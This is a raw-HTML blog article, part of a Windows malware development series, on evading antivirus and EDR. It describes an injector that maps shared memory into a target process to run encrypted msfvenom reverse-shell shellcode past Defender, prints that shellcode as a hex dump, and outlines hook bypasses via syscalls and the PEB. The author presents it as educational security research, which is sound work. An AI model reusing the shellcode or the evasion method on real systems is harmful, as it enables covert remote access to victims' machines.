          target="_blank"
          aria-label="Envelope"
          rel="me noopener noreferrer"
          ><span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z"/></svg>
  </span>

</span></a
        >
      
    
  </div>

</div>
  </div>
</div>

      

      

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#avedrs">AV/EDRs</a></li>
    <li><a href="#teb--peb">TEB &amp; PEB</a></li>
    <li><a href="#development">Development</a></li>
    <li><a href="#edr-evasion">EDR Evasion</a></li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#avedrs">AV/EDRs</a></li>
    <li><a href="#teb--peb">TEB &amp; PEB</a></li>
    <li><a href="#development">Development</a></li>
    <li><a href="#edr-evasion">EDR Evasion</a></li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



  (function () {
    var $toc = $('#TableOfContents');
    if ($toc.length > 0) {
      var $window = $(window);

      function onScroll() {
        var currentScroll = $window.scrollTop();
        var h = $('.anchor');
        var id = "";
        h.each(function (i, e) {
          e = $(e);
          if (e.offset().top - $(window).height()/3 <= currentScroll) {
            id = decodeURIComponent(e.attr('id'));
          }
        });
        var active = $toc.find('a.active');      
        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;

        active.each(function (i, e) {
          
            $(e).removeClass('active');
          
        });
        $toc.find('a[href="#' + id + '"]').addClass('active')
        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
          $(e).children('a').parents('ul').show();          
        });
      }

      $window.on('scroll', onScroll);
      $(document).ready(function () {
        
        onScroll();
      });
    }
  })();


</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        
<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5"  open >
    
    <summary
        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
        Windows Malware Development - This article is part of a series. &nbsp &nbsp
    </summary>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="https://gridsec.net/posts/windows-malware-development/introduction/">
            Part 1: Introduction to Windows Architecture
        </a>
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        Part 2: This Article
    </div>
    
    
    
    <div
        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        <a href="https://gridsec.net/posts/windows-malware-development/debugging-and-mitigation/">
            Part 3: Debugging and Mitigation
        </a>
    </div>
    
    


</details>



        <div class="article-content max-w-prose mb-20">
          

<h2 class="relative group">AV/EDRs 
    <div id="avedrs" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#avedrs" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Now that the theoretical foundation of Microsoft architecture is laid out, how do PE files work dynamically and how can we abuse them? It is worth noting that depending on the threat protection software such as antivirus (AV) or Endpoint Detection and Response (EDR) used, the malware might detected and removed. Threat protection software mainly uses two different detection mechanisms: static and dynamic analysis. Static analysis usually encompasses things like the hash of the file and what it&rsquo;s importing. Dynamic analysis is monitoring the binary at runtime to determine if the actions it takes are malicious or not. For example, Wannacry is a highly signatured malware specimen in which the hash is known to be malicious. However if a single line is changed, it will change the hash, and by extension, not be as detectable. This is when dynamic detection comes into play. If some malware is trying to inject into a process and execute the newly injected code, that can be seen as malicious activity since no process should be injecting code into another process and executing that code. By changing the behavior of the injection process, it can alter how it is detected at runtime. A critical piece in all of this is how AV/EDR engines detect these things and, by extension, how we might avoid detection.</p>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  >

  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>

  </span>


  </span>

  <span
    
      class="dark:text-neutral-300"
    >AV/EDRs change frequently so that what is accurate <em>now</em> might not be in the future. I will try to keep this article updated but it is always a cat and mouse game with malware development. The information presented is accurate as of the date of this article. If there are changes needing to be made, please feel free to reach out to me.</span>
</div>



<h2 class="relative group">TEB &amp; PEB 
    <div id="teb--peb" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#teb--peb" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>When the binaries are copied into memory, they are assigned a Thread Environment Block (TEB) and a Process Environment Block (PEB). Both hold information about the specific thread/process such as what modules (DLLs) are loaded, where they are in memory, if the process is being debugged, and much more. The TEB is the initial access vector to all of these. Embedded in the TEB is a pointer to the PEB. There are a few API calls that can be made to access the TEB, but under the hood, they all do the same thing.</p>
<p>To access the TEB at the low level, the <code>gs</code> register (x64 bit) will essentially hold a pointer to the base address for the TEB. Thus, a call out to <code>gs:[0x00]</code> in assembly will drop you into the start of the struct.</p>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  >

  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
<path fill="currentColor" d="M320 32c-8.1 0-16.1 1.4-23.7 4.1L15.8 137.4C6.3 140.9 0 149.9 0 160s6.3 19.1 15.8 22.6l57.9 20.9C57.3 229.3 48 259.8 48 291.9v28.1c0 28.4-10.8 57.7-22.3 80.8c-6.5 13-13.9 25.8-22.5 37.6C0 442.7-.9 448.3 .9 453.4s6 8.9 11.2 10.2l64 16c4.2 1.1 8.7 .3 12.4-2s6.3-6.1 7.1-10.4c8.6-42.8 4.3-81.2-2.1-108.7C90.3 344.3 86 329.8 80 316.5V291.9c0-30.2 10.2-58.7 27.9-81.5c12.9-15.5 29.6-28 49.2-35.7l157-61.7c8.2-3.2 17.5 .8 20.7 9s-.8 17.5-9 20.7l-157 61.7c-12.4 4.9-23.3 12.4-32.2 21.6l159.6 57.6c7.6 2.7 15.6 4.1 23.7 4.1s16.1-1.4 23.7-4.1L624.2 182.6c9.5-3.4 15.8-12.5 15.8-22.6s-6.3-19.1-15.8-22.6L343.7 36.1C336.1 33.4 328.1 32 320 32zM128 408c0 35.3 86 72 192 72s192-36.7 192-72L496.7 262.6 354.5 314c-11.1 4-22.8 6-34.5 6s-23.5-2-34.5-6L143.3 262.6 128 408z"/></svg>
  </span>


  </span>

  <span
    
      class="dark:text-neutral-300"
    >The struct for the TEB can be found in the <code>winternl.h</code> header file. However most of it is undocumented (this is why most of the members are reserved). For the purposes of this article, the official header file definition will do just fine, and appears below:</span>
</div>


<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_TEB</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved1</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PPEB</span> <span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved2</span><span class="p">[</span><span class="mi">399</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved3</span><span class="p">[</span><span class="mi">1952</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">TlsSlots</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Reserved4</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved5</span><span class="p">[</span><span class="mi">26</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">ReservedForOle</span><span class="p">;</span>  <span class="c1">// Windows 2000 only
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">PVOID</span> <span class="n">Reserved6</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">TlsExpansionSlots</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">TEB</span><span class="p">,</span> <span class="o">*</span><span class="n">PTEB</span><span class="p">;</span></span></span></code></pre></div><p>Notice the second member which is the pointer to the PEB. This member is always at an offset of <code>0x60</code> in hex, or 96 bytes. Although this is a kernel level struct, like the NTAPI, therefore the offset can change through updates. That being said, grabbing the PEBs base address can be done in several ways. The way this happens under the hood for all of them (that I am aware of) is a call to <code>gs:[0x60]</code> in assembly. The call goes into the TEB and adds the offset of <code>0x60</code> which belongs to the member holding the pointer to the PEB.</p>


<h2 class="relative group">Development 
    <div id="development" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#development" aria-label="Anchor">#</a>
    </span>        
    
</h2>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  >

  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>

  </span>


  </span>

  <span
    
      class="dark:text-neutral-300"
    >Due to ethical and moral reasons, I will not be providing the source code. As of the writing of this article, it still bypasses Defender and has full capabilities. Therefore, I will not release it; although that may change in future updates to this article.</span>
</div>

<p>So how did I create my malware and what was my methodology? I started by thinking about what I wanted it to do. Because I have not done this before, I decided to start simple and create a basic TCP reverse shell injector. Although this could be easily done with a Powershell one-liner, I wanted this to be malleable so that any shellcode could be swapped in and it would still work. I also wanted a challenge to bypass WIndows Defender by using a highly signatured payload. The payload I decided to start with was an msfvenom stageless TCP reverse shell. I don&rsquo;t have access to test against enterprise or higher-end EDRs, so please note that the development and objectives here reflect that of bypassing Microsoft Defender.</p>
<p>As mentioned previously, AV/EDR engines work distinctly in static and dynamic analysis. The easiest way I have found to bypass with is static analysis using techniques such as encryption. I opted to encrypt my shellcode within a byte array variable. This means that the encrypted shellcode would be held in the <code>.text</code> section of the PE file. Encryption will usually increase the entropy of the file, thus making it more suspicious to the engines. However, Defender doesn&rsquo;t do a deep analysis (that I am aware of) so I wasn&rsquo;t concerned in that regard.</p>
<p>The logic of the malware itself is fairly straight forward. The idea is that once it&rsquo;s executed, it will inject the shellcode into the target process, decrypt, and run the payload which will callback to a remote listener. The first thing it does is hunt for the victim process which will become the &ldquo;proxy&rdquo; within which the payload will be injected. This is done for several reasons, but mainly it&rsquo;s because if the EDR catches the shellcode, it won&rsquo;t burn the injector, signature it, and alert on it. Instead it will alert on the target process having malicious shellcode in it and kill that. In an enterprise environment, the target process should also be one that usually performs actions that are aligned with those in which you are taking. For example, if I am injecting a reverse shell into <code>notepad.exe</code>, this should throw alarm bells off since notepad isn&rsquo;t normally reaching out to other systems. In fact it&rsquo;s only there to create local notes on disk. A less suspicious and quiet way is to inject into <code>explorer.exe</code> because that usually is connected to file shares and reaching out to other systems in the network. Even better, what if <code>firefox.exe</code> is running? That also would work as it always is reaching out to the internet. In the wild, it would be best to manually search the processes currently running in the system and see which ones fit your use case. For my proof of concept, I elected to use <code>notepad.exe</code> as the target process as that is a good way to control the behavior of my malware along with debugging and showing the capabilities. It also will be more suspicious and thus is a good way to showcase this process (given that is for educational purposes).</p>
<p>Once it finds the target process, it will create a mapping of memory between itself and the target. Effectively this means that any changes in the specified memory region will be replicated across both processes. Think of it as when a symlink is used between directories in the file system but instead of it being directories on the disk, it is a region within memory. This is done because injecting memory into a process is highly monitored and signatured. For example, using the <code>VirtualAllocEx</code> WinAPI function (which creates a memory region within a target process) will get caught most of the time when using it to inject a malicious payload because it has been used for malicious purposes too many times. For this reason, even with encryption, for every change in the memory region, Defender will potentially scan it. As mentioned above, processes should seldom be injecting into other processes and executing that injected code. I found that a way around this scrutiny is to map the two processes together to create virtually a single address space within which I can work. I do this first before decrypting the shellcode because when the allocation of the new memory region takes place, it also zeros it out. Therefore, when the memory is scanned, it will look benign with only zeros and nothing else within it.</p>
<p>Now that the location of the shellcode is allocated and mapped, I am able to decrypt the shellcode. Windows Defender (and other EDRs) usually scan the memory when changes occur. This is why I zero out the new region when the initial allocation is done. This is especially prevalent when injecting new data from one process&rsquo;s memory to another because it isn&rsquo;t local to the current process. However, because of the mapped region, I can decrypt and copy the shellcode locally within the mapped memory without having to touch the target process. It is fairly normal for a process to manipulate its own memory so Defender usually won&rsquo;t scrutinize it closely. Once copied, the target process will contain the malicious shellcode injected into it and all that is left is to execute it.</p>
<p>The execution uses a simple call to create a new thread on the target process, but instead of starting the thread with the intended starting address, I can specify it to start with the base address of the mapped memory holding the shellcode. This will start the execution of the injected malicious shellcode and, therefore, gain a callback to my listener for the reverse shell.</p>
<p>To make sure it wasn&rsquo;t a one off (or something strange happened), I executed it multiple times and still got the same result. I also created an executable version of the payload through <code>msfvenom</code> and as soon as it touched the disk, it got caught. The results of these tests suggest that this method is valid, and my stager successfully bypassed Windows Defender!</p>
<p>Here is a quick proof of concept demo to show the malware in action:</p>
<video width="2560" height="1440" controls>
	<source src="img/2025-05-02%2020-23-23.mp4" type="video/mp4">
	Your browser does not support the video tag.
</video>
<p>The Windows box is fully up to date, and as you can see there are no threats detected. This result means that Defender did not alert or pick up on any malicious activity even though the shellcode was executed and got a successful callback to the remote listener. Let&rsquo;s go a bit more in depth for the memory analysis to observe the shellcode in the live memory dump:</p>
<p>
    <figure>
      <img
        class="my-0 rounded-md"
        loading="lazy"
        srcset="
        /posts/windows-malware-development/developing-malware/img/Mem-Dump_hu_90dc0dff822b1de6.png 330w,
        /posts/windows-malware-development/developing-malware/img/Mem-Dump_hu_cccc818866a52fd2.png 660w,
        /posts/windows-malware-development/developing-malware/img/Mem-Dump_hu_3d77a1d74079fa8a.png 1024w,
        /posts/windows-malware-development/developing-malware/img/Mem-Dump_hu_7f5c92f3ee5156ea.png 2x"
        src="/posts/windows-malware-development/developing-malware/img/Mem-Dump_hu_cccc818866a52fd2.png"
        alt=""
      />
      
    </figure>
</p>
<p>Notice the first few bytes of the payload. This is important because the byte array of <code>fc 48 83 e4</code> is a well known signature of msfvenom payloads; they usually start this way or some similar form. In other words, this signifies the successful injection and detection bypass of Defender with a known malicious signature. Following that, you can see the rest of the payload in the mapped memory region. This matches up to what the original shellcode was that was generated before being encrypted and loaded into the malware:</p>

<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-Text" data-lang="Text"><span class="line"><span class="cl">┌──(kali㉿kali)-[~]
</span></span><span class="line"><span class="cl">└─$ xxd byte.bin 
</span></span><span class="line"><span class="cl">00000000: fc48 83e4 f0e8 c000 0000 4151 4150 5251  .H........AQAPRQ
</span></span><span class="line"><span class="cl">00000010: 5648 31d2 6548 8b52 6048 8b52 1848 8b52  VH1.eH.R`H.R.H.R
</span></span><span class="line"><span class="cl">00000020: 2048 8b72 5048 0fb7 4a4a 4d31 c948 31c0   H.rPH..JJM1.H1.
</span></span><span class="line"><span class="cl">00000030: ac3c 617c 022c 2041 c1c9 0d41 01c1 e2ed  .&lt;a|., A...A....
</span></span><span class="line"><span class="cl">00000040: 5241 5148 8b52 208b 423c 4801 d08b 8088  RAQH.R .B&lt;H.....
</span></span><span class="line"><span class="cl">00000050: 0000 0048 85c0 7467 4801 d050 8b48 1844  ...H..tgH..P.H.D
</span></span><span class="line"><span class="cl">00000060: 8b40 2049 01d0 e356 48ff c941 8b34 8848  .@ I...VH..A.4.H
</span></span><span class="line"><span class="cl">00000070: 01d6 4d31 c948 31c0 ac41 c1c9 0d41 01c1  ..M1.H1..A...A..
</span></span><span class="line"><span class="cl">00000080: 38e0 75f1 4c03 4c24 0845 39d1 75d8 5844  8.u.L.L$.E9.u.XD
</span></span><span class="line"><span class="cl">00000090: 8b40 2449 01d0 6641 8b0c 4844 8b40 1c49  .@$I..fA..HD.@.I
</span></span><span class="line"><span class="cl">000000a0: 01d0 418b 0488 4801 d041 5841 585e 595a  ..A...H..AXAX^YZ
</span></span><span class="line"><span class="cl">000000b0: 4158 4159 415a 4883 ec20 4152 ffe0 5841  AXAYAZH.. AR..XA
</span></span><span class="line"><span class="cl">000000c0: 595a 488b 12e9 57ff ffff 5d49 be77 7332  YZH...W...]I.ws2
</span></span><span class="line"><span class="cl">000000d0: 5f33 3200 0041 5649 89e6 4881 eca0 0100  _32..AVI..H.....
</span></span><span class="line"><span class="cl">000000e0: 0049 89e5 49bc 0200 115c c0a8 7c80 4154  .I..I....\..|.AT
</span></span><span class="line"><span class="cl">000000f0: 4989 e44c 89f1 41ba 4c77 2607 ffd5 4c89  I..L..A.Lw&amp;...L.
</span></span><span class="line"><span class="cl">00000100: ea68 0101 0000 5941 ba29 806b 00ff d550  .h....YA.).k...P
</span></span><span class="line"><span class="cl">00000110: 504d 31c9 4d31 c048 ffc0 4889 c248 ffc0  PM1.M1.H..H..H..
</span></span><span class="line"><span class="cl">00000120: 4889 c141 baea 0fdf e0ff d548 89c7 6a10  H..A.......H..j.
</span></span><span class="line"><span class="cl">00000130: 4158 4c89 e248 89f9 41ba 99a5 7461 ffd5  AXL..H..A...ta..
</span></span><span class="line"><span class="cl">00000140: 4881 c440 0200 0049 b863 6d64 0000 0000  H..@...I.cmd....
</span></span><span class="line"><span class="cl">00000150: 0041 5041 5048 89e2 5757 574d 31c0 6a0d  .APAPH..WWWM1.j.
</span></span><span class="line"><span class="cl">00000160: 5941 50e2 fc66 c744 2454 0101 488d 4424  YAP..f.D$T..H.D$
</span></span><span class="line"><span class="cl">00000170: 18c6 0068 4889 e656 5041 5041 5041 5049  ...hH..VPAPAPAPI
</span></span><span class="line"><span class="cl">00000180: ffc0 4150 49ff c84d 89c1 4c89 c141 ba79  ..API..M..L..A.y
</span></span><span class="line"><span class="cl">00000190: cc3f 86ff d548 31d2 48ff ca8b 0e41 ba08  .?...H1.H....A..
</span></span><span class="line"><span class="cl">000001a0: 871d 60ff d5bb f0b5 a256 41ba a695 bd9d  ..`......VA.....
</span></span><span class="line"><span class="cl">000001b0: ffd5 4883 c428 3c06 7c0a 80fb e075 05bb  ..H..(&lt;.|....u..
</span></span><span class="line"><span class="cl">000001c0: 4713 726f 6a00 5941 89da ffd5            G.roj.YA....</span></span></code></pre></div>

<h2 class="relative group">EDR Evasion 
    <div id="edr-evasion" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#edr-evasion" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>With the knowledge presented thus far, there are a few theoretical ways to improve this malware to bypass high end and enterprise EDRs. Although I don&rsquo;t go into every possible way this could be achieved, the following are a couple that I have researched and learned over the course of this project.</p>
<p>Some EDRs work by hooking into a plethora of DLLs commonly used and proxying the calls to their functions through the EDRs engine. This in turn performs correlation analysis to determine if there is any malicious activity. Both of these techniques use functionalities to call the original DLLs functions, thereby, bypassing the hooked function.</p>
<p>The the first technique builds from how the WinAPI works as described in the previous article. Calling the API natively will get caught through the EDR. Instead calling the NTAPI version from <code>ntdll.dll</code> could potentially alleviate some detection (although most EDRs now hook into <code>ntdll.dll</code> anyway). Directly calling the syscall would be even better because the call is going through the kernel itself without needing any DLLs to assist, thus bypassing the hooked functions.</p>
<p>A second way to bypass the hook is through the PEB. Specifically there are a few members within the PEB that provide information useful to call the original function. Grabbing a specific member will give a pointer to the base address to the function without the hook in place. To do this there are a few extra things to know such as how to grab the TEB in the first place.</p>

  



<div
  
    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
  >

  <span
    
      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
    >

    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
<path fill="currentColor" d="M320 32c-8.1 0-16.1 1.4-23.7 4.1L15.8 137.4C6.3 140.9 0 149.9 0 160s6.3 19.1 15.8 22.6l57.9 20.9C57.3 229.3 48 259.8 48 291.9v28.1c0 28.4-10.8 57.7-22.3 80.8c-6.5 13-13.9 25.8-22.5 37.6C0 442.7-.9 448.3 .9 453.4s6 8.9 11.2 10.2l64 16c4.2 1.1 8.7 .3 12.4-2s6.3-6.1 7.1-10.4c8.6-42.8 4.3-81.2-2.1-108.7C90.3 344.3 86 329.8 80 316.5V291.9c0-30.2 10.2-58.7 27.9-81.5c12.9-15.5 29.6-28 49.2-35.7l157-61.7c8.2-3.2 17.5 .8 20.7 9s-.8 17.5-9 20.7l-157 61.7c-12.4 4.9-23.3 12.4-32.2 21.6l159.6 57.6c7.6 2.7 15.6 4.1 23.7 4.1s16.1-1.4 23.7-4.1L624.2 182.6c9.5-3.4 15.8-12.5 15.8-22.6s-6.3-19.1-15.8-22.6L343.7 36.1C336.1 33.4 328.1 32 320 32zM128 408c0 35.3 86 72 192 72s192-36.7 192-72L496.7 262.6 354.5 314c-11.1 4-22.8 6-34.5 6s-23.5-2-34.5-6L143.3 262.6 128 408z"/></svg>
  </span>


  </span>

  <span
    
      class="dark:text-neutral-300"
    >The following TEB struct is a more comprehensive version that has been documented over the years thanks to the <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_TEB64" target="_blank"><u>Vergilius Project</u></a> which documents the undocumented Windows structures. However the TEB is massive, so this is just a snippet of it:</span>
</div>


<div class="highlight"><pre tabindex="0" class="chroma-custom"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_TEB</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_NT_TIB</span> <span class="n">NtTib</span><span class="p">;</span>                                                   <span class="c1">//0x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">EnvironmentPointer</span><span class="p">;</span>                                               <span class="c1">//0x38
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">_CLIENT_ID</span> <span class="n">ClientId</span><span class="p">;</span>                                             <span class="c1">//0x40
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">ActiveRpcHandle</span><span class="p">;</span>                                                  <span class="c1">//0x50
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">ThreadLocalStoragePointer</span><span class="p">;</span>                                        <span class="c1">//0x58
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">_PEB</span><span class="o">*</span> <span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>                                   <span class="c1">//0x60
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">LastErrorValue</span><span class="p">;</span>                                                   <span class="c1">//0x68
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">CountOfOwnedCriticalSections</span><span class="p">;</span>                                     <span class="c1">//0x6c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">CsrClientThread</span><span class="p">;</span>                                                  <span class="c1">//0x70
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">Win32ThreadInfo</span><span class="p">;</span>                                                  <span class="c1">//0x78
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">User32Reserved</span><span class="p">[</span><span class="mi">26</span><span class="p">];</span>                                               <span class="c1">//0x80
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">UserReserved</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>                                                  <span class="c1">//0xe8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">WOW32Reserved</span><span class="p">;</span>                                                    <span class="c1">//0x100
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">CurrentLocale</span><span class="p">;</span>                                                    <span class="c1">//0x108
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ULONG</span> <span class="n">FpSoftwareStatusRegister</span><span class="p">;</span>                                         <span class="c1">//0x10c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">ReservedForDebuggerInstrumentation</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>                           <span class="c1">//0x110
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">VOID</span><span class="o">*</span> <span class="n">SystemReserved1</span><span class="p">[</span><span class="mi">25</span><span class="p">];</span>                                              <span class="c1">//0x190
